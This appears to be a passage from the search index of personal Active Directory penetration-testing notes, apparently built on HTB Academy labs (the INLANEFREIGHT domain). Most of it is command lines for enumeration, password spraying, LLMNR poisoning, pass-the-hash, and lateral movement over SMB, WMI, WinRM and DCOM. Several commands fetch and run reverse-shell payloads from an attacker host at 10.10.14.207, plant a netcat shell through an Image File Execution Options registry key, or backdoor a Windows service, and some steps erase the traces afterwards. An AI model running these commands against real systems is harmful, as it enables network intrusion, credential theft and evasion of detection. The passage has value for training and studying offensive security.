AD module:<ol> <li><code>Import-Module .\\Microsoft.ActiveDirectory.Management.dll</code></li> <li><code>Import-Module .\\ActiveDirectory\\ActiveDirectory.psdl</code></li> </ol> </li> <li>Enumerate Domain: <code>Get-ADDomain</code></li> <li>Get object of another domain: <code>Get-ADDomain -Identity domain-name</code></li> <li>Get Domain SID: <code>(Get-ADDomain).DomainSID</code></li> <li>Get Domain Policy: <code></code></li> <li>Get info about DC: <code>Get-ADDomainController</code> </li> <li>Get info about DC from another domain: <code>Get-ADDomainController -Identity domain-name</code> </li> <li>Get all users: <code>Get-ADUser -Filter *</code> </li> <li>Get all users and select property: <code>Get-ADUser -Filter * - Properties name</code> </li> <li>Get particular user with all properties: <code>Get-ADUser -Identity user-name -Properties *</code> </li> <li>Get password last set for all users: <code>Get-UserProperty -Properties pwdlastset</code> </li> <li>Checking description property for find passwords: <code>Get-ADUser -Filter 'Description -like \"password\"' -Properties Description | select Name,Description</code></li> <li>Get Computer from current domain: <code>Get-ADComputer -Filter *</code></li> <li>Get all groups in current domain: <code>Get-ADGroup -Filter *</code></li> <li>Get all members of the group: <code>Get-ADGroupMember -Identity \"Domain Admins\" -Recursive</code></li> <li>Get group membership for a user: <code>Get-ADPrincipalGroupMembership -Identity user-name</code></li> <li>Get local groups: `</li> <li>Get Domain Trust: <code>Get-ADTrust</code></li> <li>Get details about current forest: <code>Get-ADForest</code>, <code>Get-ADForest -Identity domain-name</code></li> <li> <p>Get all domains in current forest: <code>(Get-ADForest).Domains</code></p> </li> <li> <p>Find all machines on the current domain where the current user has local admin access: <code>Find-LocalAdminAccess -Verbose</code></p> <ol> <li>Check Find-WMILocalAdminAccess.ps1 also. Both are very noisy.</li> </ol> </li> <li>Find local admin on all machines of the domain: <code>Invoke-EnumerateLocalAdmin -Verbose</code></li> <li>Find computers where a domain admin (or specified user or group) has session: <code>Invoke-UserHunter - GroupName \"RDPUsers\"</code></li> <li>Find computers where domain admin is logged-on: <code>Invoke-UserHunter -Stealth</code></li> </ol>"},{"location":"active-directory/crtp/#privilege-escalation","title":"Privilege Escalation","text":"<ol> <li>Tools:<ol> <li>PowerUp</li> <li>BeRoot</li> <li>PrivEsc</li> </ol> </li> </ol>"},{"location":"active-directory/initial/","title":"Initial","text":""},{"location":"active-directory/initial/#basic-steps","title":"Basic steps","text":"<ol> <li>Start Wireshark: <code>sudo -E wireshark</code></li> <li>Tcpdump Output: <code>sudo tcpdump -i ens224</code></li> <li>Use Responder: <code>sudo responder -I ens224 -A</code></li> <li>FPing Active Checks: <code>fping -asgq 172.16.5.0/23</code></li> <li>Nmap Scanning: <code>sudo nmap -v -A -iL hosts.txt</code></li> </ol>"},{"location":"active-directory/initial/#identifying-users-with-kerbrute","title":"Identifying Users with Kerbrute","text":"<pre><code>sudo git clone https://github.com/ropnop/kerbrute.git`\nsudo make all\n./kerbrute_linux_amd64 \nsudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\nkerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n</code></pre>"},{"location":"active-directory/initial/#llmnrnbt-ns-poisoning-from-linux","title":"LLMNR/NBT-NS Poisoning - from Linux","text":"<ol> <li>Run Responder: <code>sudo responder -I ens224</code></li> <li>Cracking an NTLMv2 Hash With Hashcat: <code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/initial/#llmnrnbt-ns-poisoning-from-windows","title":"** LLMNR/NBT-NS Poisoning - from Windows**","text":"<ol> <li>Inveigh<ol> <li><code>Import-Module .\\Inveigh.ps1</code></li> <li><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></li> </ol> </li> <li>C# Inveigh (InveighZero): <code>.\\Inveigh.exe</code></li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-linux-credentialed","title":"Enumerating the Password Policy - from Linux - Credentialed","text":"<ol> <li>CME: <code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></li> <li>RPCClient:<ol> <li><code>rpcclient -U \"\" -N 172.16.5.5</code></li> <li><code>querydominfo</code></li> </ol> </li> <li>Enum4linux: <code>enum4linux -P 172.16.5.5</code></li> <li>Enum4linux-ng: <code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></li> </ol>"},{"location":"active-directory/initial/#enumerating-null-session-from-windows","title":"Enumerating Null Session - from Windows","text":"<ol> <li>Establish a null session from windows: <code>net use \\\\DC01\\ipc$ \"\" /u:\"\"</code></li> <li>Common errors when trying to authenticate:<ol> <li><code>net use \\\\DC01\\ipc$ \"\" /u:guest</code> System error 1331 has occurred. This user can't sign in because this account is currently disabled.</li> <li><code>net use \\\\DC01\\ipc$ \"password\" /u:guest</code><ol> <li>System error 1326 has occurred. The user name or password is incorrect.</li> <li>System error 1909 has occurred. The referenced account is currently locked out and may not be logged on to.</li> </ol> </li> </ol> </li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-linux-ldap-anonymous-bind","title":"Enumerating the Password Policy - from Linux - LDAP Anonymous Bind","text":"<ol> <li>Ldapsearch: <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength</code></li> <li></li> </ol>"},{"location":"active-directory/initial/#enumerating-the-password-policy-from-windows","title":"Enumerating the Password Policy - from Windows","text":"<ol> <li>Using net.exe: <code>net accounts</code></li> <li>Using PowerView: <code>Get-DomainPolicy</code></li> </ol>"},{"location":"active-directory/initial/#password-spraying-making-a-target-user-list","title":"Password Spraying - Making a Target User List","text":"<ol> <li>Using enum4linux: <code>enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"</code></li> <li>Using rpcclient: <ol> <li><code>rpcclient -U \"\" -N 172.16.5.5</code></li> <li><code>enumdomusers</code></li> </ol> </li> <li>Using CrackMapExec --users Flag: <code>crackmapexec smb 172.16.5.5 --users</code></li> <li>Gathering Users with LDAP Anonymous:<ol> <li>Using ldapsearch: <code>ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"</code></li> <li>Using windapsearch: <code>./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U</code></li> </ol> </li> <li>Kerbrute User Enumeration: <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></li> <li></li> </ol>"},{"location":"active-directory/initial/#credentialed-enumeration-to-build-our-user-list","title":"Credentialed Enumeration to Build our User List","text":"<ol> <li>CME: <code>sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users</code></li> </ol>"},{"location":"active-directory/initial/#internal-password-spraying-from-linux","title":"Internal Password Spraying - from Linux","text":"<ol> <li>Using a Bash one-liner for the Attack: <code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done</code></li> <li>Using Kerbrute for the Attack: <code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></li> <li>Using CrackMapExec &amp; Filtering Logon Failures: <code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></li> <li>Validating the Credentials with CrackMapExec: <code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></li> <li>Local Admin Spraying with CrackMapExec: <code>sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></li> </ol>"},{"location":"active-directory/initial/#internal-password-spraying-from-windows","title":"Internal Password Spraying - from Windows","text":"<ol> <li>Using DomainPasswordSpray.ps1: <ol> <li><code>Import-Module .\\DomainPasswordSpray.ps1</code></li> <li><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></li> </ol> </li> </ol>"},{"location":"active-directory/lateralmovement/","title":"Lateral Movement","text":""},{"location":"active-directory/lateralmovement/#kerberos-double-hop-problem","title":"Kerberos \"Double Hop\" Problem","text":""},{"location":"active-directory/lateralmovement/#workaround-1-pscredential-object","title":"Workaround #1: PSCredential Object","text":"<ol> <li>Try to execute a command: <code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; import-module .\\PowerView.ps1</code></li> <li>Check with klist: <code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; klist</code></li> <li>Set up a PSCredential object and try again to execute a command: <ol> <li><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force</code></li> <li><code>$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)</code></li> <li><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn -credential $Cred | select samaccountname</code></li> </ol> </li> </ol>"},{"location":"active-directory/lateralmovement/#workaround-2-register-pssession-configuration","title":"Workaround #2: Register PSSession Configuration","text":"<ol> <li>Establishing a WinRM session on the remote host: <code>Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\\backupadm</code></li> <li>Check tickets with klist: <code>klist</code></li> <li>One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet: <code>Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm</code></li> <li>Restart the WinRM service by typing <code>Restart-Service WinRM</code> in current PSSession.</li> <li>Check again with <code>klist</code> and the double hop problem has been eliminated.</li> </ol>"},{"location":"active-directory/lateralmovement/#rdp","title":"RDP","text":"<ol> <li>RDP Enumeration: <code>netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local</code></li> <li>Optimizing xfreerdp for Low Latency Networks or Proxy Connections: <code>xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache</code></li> <li>Confirm if Restricted Admin Mode is enabled: <code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin</code></li> <li>o enable Restricted Admin Mode, we would set the DisableRestrictedAdmin value to 0: <code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD</code></li> <li>To perform Pass the Hash from a Linux machine, we can use xfreerdp with the /pth option to use a hash and connect to RDP: <code>proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52</code></li> <li>For Pass the Ticket we can use Rubeus:<ol> <li><code>.\\Rubeus.exe createnetonly /program:powershell.exe /show</code></li> <li><code>.\\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt</code></li> <li>From the window where we imported the ticket, we can use the mstsc /restrictedAdmin command: <code>mstsc.exe /restrictedAdmin</code></li> </ol> </li> </ol>"},{"location":"active-directory/lateralmovement/#sharprdp","title":"SharpRDP","text":"<ol> <li>Execute Metasploit to listen on port 8888: <code>msfconsole -x \"use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j\"</code></li> <li>Generate a payload with msfvenom using PowerShell Reflection: <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s</code></li> <li>Use python http server to host our payload: <code>sudo python3 -m http.server 80</code></li> <li>Now we can use SharpRDP to execute a powershell command to execute our payload and provide a session: <code>.\\SharpRDP.exe computername=srv01 command=\"powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')\" username=inlanefreight\\helen password=RedRiot88</code></li> <li>Use CleanRunMRU to clean all command records:<ol> <li>Get the tool: <code>wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs</code></li> <li>Use csc.exe to compile it: <code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe .\\CleanRunMRU.cs</code></li> <li>Use CleanRunMRU.exe to clear all commands: <code>.\\CleanRunMRU.exe  clearall</code></li> </ol> </li> </ol>"},{"location":"active-directory/lateralmovement/#server-message-block-smb","title":"Server Message Block (SMB)","text":"<ol> <li>SMB Enumeration: <code>proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn</code></li> <li>Use PsExec to connect to a remote host and execute commands interactivelly: <code>.\\PsExec.exe \\\\SRV02 -i -u INLANEFREIGHT\\helen -p RedRiot88 cmd</code></li> <li>To execute our payload as NT AUTHORITY\\SYSTEM, we need to specify the option -s which means that it will run with SYSTEM privileges: <code>.\\PsExec.exe \\\\SRV02 -i -s -u INLANEFREIGHT\\helen -p RedRiot88 cmd</code></li> <li>Perform lateral movement with SharpNoPSExec:<ol> <li>Start listening with Netcat: <code>nc -lnvp 8080</code></li> <li>Generate the reverse shell payload using https://www.revshells.com or our fother C2.</li> <li>Run SharpNoPSExec<code>.\\SharpNoPSExec.exe --target=172.20.0.52 --payload=\"c:\\windows\\system32\\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA==\"</code></li> </ol> </li> <li>Nimexec works simillary to SharpNoPSExec:<ol> <li>Start listening with Netcat: <code>nc -lnvp 8080</code></li> <li>Generate the reverse shell payload using revshells.com, and to convert the plain text password to NTLM hash, we can use this recipe in CyberChef: <code>.\\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c \"cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==\" -v</code></li> </ol> </li> <li>Reg.exe: <ol> <li>Set up an SMB server to host our payload: <code>sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe</code></li> <li>Execute our Netcat listener: <code>nc -lnvp 8080</code></li> <li>Execute reg.exe to add a new registry key to Microsoft Edge (msedge.exe): <code>reg.exe add \"\\\\srv02.inlanefreight.local\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msedge.exe\" /v Debugger /t reg_sz /d \"cmd /c copy \\\\172.20.0.99\\share\\nc.exe &amp;&amp; nc.exe -e \\windows\\system32\\cmd.exe 172.20.0.99 8080\"</code></li> <li>Once Microsoft Edge is opened by any user in the domain, we will instantly get a reverse shell.</li> <li>It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to 1: <code>reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters /v AllowInsecureGuestAuth</code></li> <li>If have an account with administrative rights, we can use the following command to allow insecure guest authentication: <code>reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f</code></li> </ol> </li> <li>Use psexec.py to get remote code execution on a target host, administrator login credentials are required: <code>proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52</code></li> <li>The smbexec.py method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative: <code>proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52</code></li> <li>The services.py script in Impacket interacts with Windows services using the MSRPC interface: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list</code><ol> <li>Use the Metasploit output option exe-service, which creates a service binary: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe</code></li> <li>Execute the command to create a new service: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path \"\\\\\\\\10.10.14.207\\\\share\\\\rshell-9001.exe\"</code></li> <li>Ensure that the SMB server has the file that will be executed: <code>sudo smbserver.py share -smb2support ./</code></li> <li>Run our Netcat listener: <code>nc -lnvp 8080</code></li> <li>View the configuration of the custom command created using config -name : <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'</code> <li>Cover up the traces and delete the service by typing delete -name : <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'</code> <li>Alternatively, we use services.py to modify existing services: <ol> <li><code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler</code></li> <li>Modify the binary path to our payload and set the START_TYPE to AUTO START with the option -start_type 2: <code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path \"\\\\\\\\10.10.14.207\\\\share\\\\rshell-9001.exe\" -start_type 2</code></li> <li>Start the service and wait for our command execution: <code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler</code></li> </ol> </li> <li>The atexec.py script utilizes the Windows Task Scheduler service, which is accessible through the atsvc SMB pipe:<ol> <li>Start a Netcat listener: <code>nc -lnvp 8080</code></li> <li>Pass the domain name, administrator user, password, and target IP address /:@, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using revshells.com: <code>proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 \"powershell -e ...SNIP...AbwBzAGUAKAApAA==\"</code>"},{"location":"active-directory/lateralmovement/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<ol> <li>WMI Enumeration: <code>nmap -p135,49152-65535 10.129.229.244 -sV</code></li> <li>To test credentials againts WMI we will use NetExec: <code>netexec wmi 10.129.229.244 -u helen -p RedRiot88</code></li> <li>To retrieve detailed information about the operating system from a remote computer: <code>wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version</code></li> <li>Perform the same action using PowerShell:: <code>Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version</code></li> <li>Using WMIC to create a new process on a remote machine: <code>wmic /node:172.20.0.52 process call create \"notepad.exe\"</code></li> <li>The same task can be accomplished using PowerShell: <code>Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"notepad.exe\" -ComputerName 172.20.0.52</code></li> <li>Specify credentials to within wmic or PowerShell:<ol> <li><code>wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version</code></li> <li><code>$credential = New-Object System.Management.Automation.PSCredential(\"username\", (ConvertTo-SecureString \"password\" -AsPlainText -Force));</code></li> </ol> </li> <li>Lateral Movement From Linux:<ol> <li>Install: <code>sudo apt-get install wmi-client</code></li> <li>Run queries against a remote Windows machine: <code>wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 \"SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem\"</code></li> <li>Impacket includes the built-in script wmiexec.py for executing commands using WMI. Keep in mind that wmiexec.py uses port 445 to retreive the output of the command and if port 445 is blocked, it won't work: <code>wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami</code></li> <li>Use NetExec to run WMI queries or execute commands using WMI: <code>proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi \"SELECT * FROM Win32_OperatingSystem\"</code></li> <li>To execute commands we can use the protocol wmi with the option -x : <code>proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami</code>"},{"location":"active-directory/lateralmovement/#windows-remote-management-winrm","title":"Windows Remote Management (WinRM)","text":"<ol> <li>Nmap scan: <code>nmap -p5985,5986 10.129.229.244 -sCV</code></li> <li>To test credentials use NetExec: <code>netexec winrm 10.129.229.244 -u frewdy -p Kiosko093</code></li> </ol>"},{"location":"active-directory/lateralmovement/#lateral-movement-from-windows","title":"Lateral Movement From Windows:","text":"<ol> <li>Use Invoke-Command to execute commands on a remote system: <code>Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }</code></li> <li>Specify credentials with the -Credential parameter:<ol> <li><code>$username = \"INLANEFREIGHT\\Helen\"</code></li> <li><code>$password = \"RedRiot88\"</code></li> <li><code>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force</code></li> <li><code>$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)</code></li> <li><code>nvoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }</code></li> </ol> </li> <li>winrs (Windows Remote Shell) is a command line tool allowing to execute commands on a Windows machine using WinRM remotely: <code>winrs -r:srv02 \"powershell -c whoami;hostname\"</code></li> <li>winrs also allow us to use explicit credentials with the options /username: and /password: as follow: <code>winrs /remote:srv02 /username:helen /password:RedRiot88 \"powershell -c whoami;hostname\"</code> <li>Copy files using a PowerShell session:<ol> <li><code>$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential</code></li> <li>Copy a file to the target machine: <code>Copy-Item -ToSession $sessionSRV02 -Path 'C:\\Users\\helen\\Desktop\\Sample.txt' -Destination 'C:\\Users\\helen\\Desktop\\Sample.txt' -Verbose</code></li> <li>Copy a file from the target machine: <code>Copy-Item -FromSession $sessionSRV02 -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Destination 'C:\\Users\\helen\\Desktop\\host.txt' -Verbose</code></li> </ol> </li> <li>Use the Enter-PSSession cmdlet for an interactive shell using PowerShell remoting: <code>Enter-PSSession $sessionSRV02</code></li> <li>Use kerberos tickets to connect to PowerShell remoting: <ol> <li>First we need to forge our TGT: <code>.\\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap</code></li> <li>Create a sacrificial process with the option createnetonly: <code>.\\Rubeus.exe createnetonly /program:powershell.exe /show</code></li> <li>Import the TGT of the account we want to use: <code>.\\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...</code></li> <li>Use this session to connect to the target machine: <code>Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate</code></li> </ol> </li>"},{"location":"active-directory/lateralmovement/#lateral-movement-from-linux","title":"Lateral Movement From Linux","text":"<ol> <li>With NetExec we can use the option -x or -X to execute CMD or PowerShell commands: <code>netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x \"ipconfig\"</code></li> <li>Use evil-winrm to connect to a remote Windows machine and execute commands: <code>evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\\frewdy' -p Kiosko093</code></li> <li>Evil-WinRM allows us to load PowerShell scripts: <code>evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\\frewdy' -p Kiosko093 -s '/home/plaintext/'</code></li> </ol>"},{"location":"active-directory/lateralmovement/#windows-powershell-web-access","title":"Windows PowerShell Web Access","text":"<ol> <li>By default the URL path for PowerShell Web Access is <code>/pswa</code> and the port will be 80 or 443. The web directory and port can be changed.</li> </ol>"},{"location":"active-directory/lateralmovement/#distributed-component-object-model-dcom","title":"Distributed Component Object Model (DCOM)","text":"<ol> <li>Nmap scan: <code>nmap -p135,49152-65535 10.129.229.244 -sCV -Pn</code></li> <li>The MMC20.Application object allows remote interaction with Microsoft Management Console (MMC), enabling us to execute commands and manage administrative tasks on a Windows system through its graphical user interface components:<ol> <li><code>nc -lnvp 8001</code></li> <li><code>$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"172.20.0.52\"));</code></li> <li><code>$mmc.Document.ActiveView.ExecuteShellCommand(\"powershell.exe\",$null,\"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==\",0)</code></li> </ol> </li> <li>ShellWindows &amp; ShellBrowserWindow:<ol> <li>Find the CLSID with the following script: <code>Get-ChildItem -Path 'HKLM:\\SOFTWARE\\Classes\\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}</code></li> <li><code>$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"SRV02\"))</code></li> <li><code>$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"172.20.0.52\"))</code></li> <li><code>nc -lnvp 8080</code></li> <li>Use a PowerShell reverse shell payload from revshells.com: <code>$shell[0].Document.Application.ShellExecute(\"cmd.exe\",\"/c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==\",\"C:\\Windows\\System32\",$null,0)</code></li> </ol> </li> <li>dcomexec.py:<ol> <li><code>nc -lnvp 8080</code></li> <li><code>proxychains4 -q python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 \"powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==\" -silentcommand</code></li> </ol> </li> </ol>"},{"location":"active-directory/lateralmovement/#secure-shell-ssh","title":"Secure Shell (SSH)","text":"<ol> <li>Scan: <code>nmap 10.129.229.244 -p 22 -sCV -Pn</code></li> <li>Test credentials using netexec: <code>netexec ssh 10.129.229.244 -u ambioris -p Ward@do9049</code></li> <li><code>ssh Ambioris@10.129.229.244</code></li> <li><code>ssh ambioris@srv01</code></li> <li><code>ssh -i C:\\helen_id_rsa -l helen@inlanefreight.local -p 22 SRV01</code></li> <li><code>icacls.exe C:\\helen_id_rsa</code></li> <li><code>copy C:\\helen_id_rsa C:\\Users\\Ambioris\\</code></li> <li><code>icacls helen_id_rsa</code></li> <li><code>ssh -i C:\\helen_id_rsa -l helen@inlanefreight.local -p 22 SRV01</code></li> </ol>"},{"location":"active-directory/ldap/","title":"LDAP","text":""},{"location":"active-directory/ldap/#microsoft-remote-server-administration-tools-rsat","title":"Microsoft Remote Server Administration Tools (RSAT)","text":"<ol> <li>PowerShell - Available RSAT Tools: <code>Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State</code></li> <li>PowerShell - Install All Available RSAT Tools: <code>Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability \u2013Online</code></li> <li>PowerShell - Install an RSAT Tool: <code>Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  \u2013Online</code></li> </ol>"},{"location":"active-directory/ldap/#enumeration-with-rsat","title":"Enumeration with RSAT","text":"<ol> <li>CMD - MMC Runas Domain User: <code>runas /netonly /user:Domain_Name\\Domain_USER mmc</code></li> </ol>"},{"location":"active-directory/ldap/#ldap-query-user-related-search","title":"LDAP Query - User Related Search","text":"<ol> <li>LDAP Query - User Related Search: <code>Get-ADObject -LDAPFilter '(objectClass=group)' | select name</code></li> <li>LDAP Query - Detailed Search: <code>Get-ADObject -LDAPFilter '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' -Properties * | select samaccountname,useraccountcontrol</code></li> </ol>"},{"location":"active-directory/ldap/#powershell-filters","title":"PowerShell Filters","text":"<ol> <li>PowerShell - Filter Installed Software: <code>get-ciminstance win32_product | fl</code></li> <li>PowerShell - Filter Out Microsoft Software: <code>get-ciminstance win32_product -Filter \"NOT Vendor like '%Microsoft%'\" | fl</code></li> <li>PowerShell - Filter Examples: <ul> <li><code>Get-ADUser -Filter \"name -eq 'sally jones'\"</code></li> <li><code>Get-ADUser -Filter {name -eq 'sally jones'}</code></li> <li><code>Get-ADUser -Filter 'name -eq \"sally jones\"'</code></li> </ul> </li> <li>PowerShell - Filter For SQL: <code>Get-ADComputer  -Filter \"DNSHostName -like 'SQL*'\"</code></li> <li>PowerShell - Filter Administrative Groups: <code>Get-ADGroup -Filter \"adminCount -eq 1\" | select Name</code></li> <li>PowerShell - Filter Administrative Users: <code>Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}</code></li> <li>PowerShell - Find Administrative Users with the ServicePrincipalName: <code>Get-ADUser -Filter \"adminCount -eq '1'\" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl</code></li> <li>PowerShell - Members Of Security Operations: <code>Get-ADGroupMember -Identity \"Security Operations\"</code></li> <li>PowerShell - User's Group Membership: <code>Get-ADUser -Identity harry.jones -Properties * | select memberof | ft -Wrap</code></li> <li>PowerShell - All Groups of User: <code>Get-ADGroup -Filter 'member -RecursiveMatch \"CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\"' | select name</code></li> <li>PowerShell - Count of All AD Users: <code>(Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -Filter *).count</code></li> <li>PowerShell - SearchScope Base: <code>Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -SearchScope Base -Filter *</code></li> <li>PowerShell - SearchScope Base OU Object: <code>Get-ADObject -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -SearchScope Base -Filter *</code></li> <li>PowerShell - Searchscope OneLevel: <code>Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -SearchScope OneLevel -Filter *</code></li> <li>PowerShell - Searchscope 1: <code>Get-ADUser -SearchBase \"OU=Employees,DC=INLANEFREIGHT,DC=LOCAL\" -SearchScope 1 -Filter *</code></li> <li>PowerShell - Searchscope Subtree: <code>(Get-ADUser -SearchBase 